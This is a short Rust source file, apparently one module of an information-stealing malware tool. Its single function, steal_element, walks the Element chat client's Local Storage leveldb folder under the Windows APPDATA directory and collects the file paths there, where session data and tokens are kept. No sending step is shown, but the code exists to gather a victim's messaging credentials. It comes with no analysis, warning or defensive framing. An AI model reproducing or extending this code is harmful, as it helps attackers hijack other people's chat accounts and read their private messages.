use walkdir::*;

pub fn steal_element() -> Vec<String> {
    let mut paths: Vec<String> = Vec::new();
    let path_str = format!("{}\\Element\\Local Storage\\leveldb\\", std::env::var("APPDATA").unwrap());
    let path = std::path::Path::new(&path_str);
    if !path.exists() {
        return Vec::new();
    }
    for entry in WalkDir::new(path).max_depth(1).into_iter().filter_map( |f | f.ok()) {
        let entry: String = entry.path().to_string_lossy().to_string();
        paths.push(entry);
    }
    paths
}